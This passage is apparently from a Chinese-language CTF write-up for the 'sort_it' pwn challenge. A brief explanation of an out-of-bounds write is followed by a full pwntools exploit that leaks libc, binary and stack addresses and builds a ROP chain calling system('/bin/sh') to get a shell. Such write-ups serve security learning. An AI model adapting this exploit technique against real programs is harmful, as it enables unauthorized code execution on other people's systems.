在函数中没有栈溢出可以利用，但是`fgets(&yn, 0x11, stdin);`，这里多读了几个字节，我们可以将`gadget`放在这里。然后计算出栈到`yn`的距离，从将`gadget`转移到栈上。

最后我们还需要对数组进行排序才能正常的`ret`，所以为了方便我们通过同样的手段将所有的元素都变成一样的。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./sort_it'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('challenge.nahamcon.com on port', 31286)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so',checksec=False)

sh.send('\n')
sh.sendlineafter('Enter the number for the word you want to select: ','1')
sh.sendlineafter('Enter the number for the word you want to replace it with: ','14')
leak_libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = leak_libc - 	0x020840
binsh=libcbase+0x18ce17
system = libcbase+0x0453a0
leak('libc base',libcbase)

sh.sendlineafter('Are the words sorted? [y/n]: ','n')
sh.sendlineafter('Enter the number for the word you want to select: ','1')
sh.sendlineafter('Enter the number for the word you want to replace it with: ','13')
leak_main = u64(sh.recvuntil('\x55')[-6:].ljust(8,'\x00'))
textbase = leak_main- elf.sym['__libc_csu_init']
leak('text base',textbase)
pop_rdi = textbase + 0x00001643
yn= textbase+0x4030

sh.sendlineafter('Are the words sorted? [y/n]: ','n')
sh.sendlineafter('Enter the number for the word you want to select: ','1')
sh.sendlineafter('Enter the number for the word you want to replace it with: ','11')
stack = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-(0xe40-0xd00)
leak('leak_stack',stack)
sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi))
sh.sendlineafter('Enter the number for the word you want to select: ','1')

sh.sendlineafter('Enter the number for the word you want to replace it with: ','11')

sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi))
sh.sendlineafter('Enter the number for the word you want to select: ','14')
sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))

sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(binsh))
sh.sendlineafter('Enter the number for the word you want to select: ','15')
sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))
#gdb.attach(sh)
sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(system))
sh.sendlineafter('Enter the number for the word you want to select: ','16')
sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))

for i in range(1,10):
    sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+'a'*8)
    sh.sendlineafter('Enter the number for the word you want to select: ',str(i))
    sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))
    
sh.sendlineafter('Are the words sorted? [y/n]: ','y')

sh.interactive()
```
